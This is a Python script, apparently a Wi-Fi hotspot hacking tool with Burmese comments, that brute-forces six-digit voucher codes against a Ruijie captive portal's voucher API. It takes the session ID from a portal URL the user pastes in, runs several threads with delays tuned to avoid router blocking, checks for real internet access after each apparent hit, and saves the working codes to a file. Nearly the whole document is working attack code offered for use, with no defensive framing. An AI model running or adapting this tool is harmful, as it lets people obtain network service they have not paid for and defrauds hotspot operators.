import requests
import threading
import random
import os
import time
from colorama import Fore, Style, init

init(autoreset=True)
C_CYAN = Fore.CYAN + Style.BRIGHT
C_GREEN = Fore.GREEN + Style.BRIGHT
C_RED = Fore.RED + Style.BRIGHT
C_YELLOW = Fore.YELLOW + Style.BRIGHT
C_WHITE = Fore.WHITE + Style.BRIGHT
C_RESET = Style.RESET_ALL

# --- [ CONFIGURATION ] ---
# အင်တာနက် ထွက်မထွက် စစ်ဆေးမည့် URL
CHECK_URL = "http://connectivitycheck.gstatic.com/generate_204"
THREADS = 5 # Router Block မခံရအောင် Thread လျှော့ထားပါတယ်
TIMEOUT = 5

stop_event = threading.Event()

def banner():
    os.system('clear')
    print(f"""{C_CYAN}
    ██████╗ ██████╗  ██████╗     ██╗   ██╗███████╗
    ██╔══██╗██╔══██╗██╔═══██╗    ██║   ██║██╔════╝
    ██████╔╝██████╔╝██║   ██║    ██║   ██║███████╗
    ██╔═══╝ ██╔══██╗██║   ██║    ╚██╗ ██╔╝╚════██║
    ██║     ██║  ██║╚██████╔╝     ╚████╔╝ ███████║
    ╚═╝     ╚═╝  ╚═╝ ╚═════╝       ╚═══╝  ╚══════╝
    {C_YELLOW}>>> RUIJIE SCANNER PRO v5.0 (Validation Logic) <<<{C_RESET}
    """)

def check_internet():
    """အင်တာနက် တကယ်ထွက်မထွက် စစ်ဆေးသည့် Logic"""
    try:
        # Redirect တွေကို မသွားဘဲ တိုက်ရိုက်ခေါ်ကြည့်သည်
        response = requests.get(CHECK_URL, timeout=5, allow_redirects=False)
        if response.status_code == 204:
            return True
    except:
        pass
    return False

def scan_logic(sid, api_url):
    while not stop_event.is_set():
        # ဂဏန်း ၆ လုံး ထုတ်ယူခြင်း
        code = "".join([str(random.randint(0, 9)) for _ in range(6)])
        payload = {"accessCode": code, "sessionId": sid, "apiVersion": 1}
        
        try:
            # ၁။ Voucher Code ကို အရင်စစ်သည်
            res = requests.post(api_url, json=payload, timeout=TIMEOUT)
            
            if "success" in res.text.lower() or res.status_code == 200:
                print(f"\n{C_YELLOW}[!] Potential Code Found: {code}. Validating...")
                
                # ၂။ ချက်ချင်း အင်တာနက် စမ်းသုံးကြည့်သည် (Validation)
                time.sleep(1) # Login အောင်မြင်ဖို့ ခဏစောင့်သည်
                if check_internet():
                    print(f"{C_GREEN}[+++] WORKING VOUCHER DISCOVERED: {code} (Internet Active!){C_RESET}")
                    with open("working_vouchers.txt", "a") as f:
                        f.write(f"CODE: {code} | DATE: {time.ctime()}\n")
                    # အလုပ်ဖြစ်တဲ့ ကုဒ်တွေ့ရင် စက်ရပ်ချင်ရင် stop_event.set() သုံးနိုင်သည်
                else:
                    print(f"{C_RED}[-] Code {code} is valid but Internet is NOT active (Used/Limit).")
            else:
                print(f"{C_WHITE}[*] Testing: {C_CYAN}{code} {C_RED}[Invalid]{C_RESET}", end="\r")
            
            # Router က Block မလုပ်အောင် Delay ပိုပေးထားသည်
            time.sleep(0.5)

        except Exception:
            time.sleep(2)

def main():
    banner()
    
    # User ဆီမှ အချက်အလက်တောင်းခြင်း
    print(f"{C_WHITE}[?] Paste Portal URL (with sessionId):{C_RESET}")
    portal_url = input(f"{C_GREEN}root@scanner:~# {C_RESET}").strip()
    
    import re
    from urllib.parse import urlparse
    
    sid_match = re.search(r'sessionId=([a-zA-Z0-9_\-]+)', portal_url)
    if sid_match:
        sid = sid_match.group(1)
        parsed = urlparse(portal_url)
        api_url = f"{parsed.scheme}://{parsed.netloc}/api/auth/voucher/"
        
        banner()
        print(f"{C_GREEN}[✓] SID Extracted: {sid}")
        print(f"{C_GREEN}[✓] API Endpoint: {api_url}")
        print(f"{C_YELLOW}[!] Threads: {THREADS} (Safe Mode)")
        print(f"{C_CYAN}[*] Validating internet connection... Please wait.\n")
        
        for i in range(THREADS):
            t = threading.Thread(target=scan_logic, args=(sid, api_url), daemon=True)
            t.start()
            
        try:
            while True: time.sleep(1)
        except KeyboardInterrupt:
            stop_event.set()
            print(f"\n{C_RED}[!] Scanner Stopped.{C_RESET}")
    else:
        print(f"{C_RED}[X] Invalid URL. Session ID not found.")

if __name__ == "__main__":
    main()
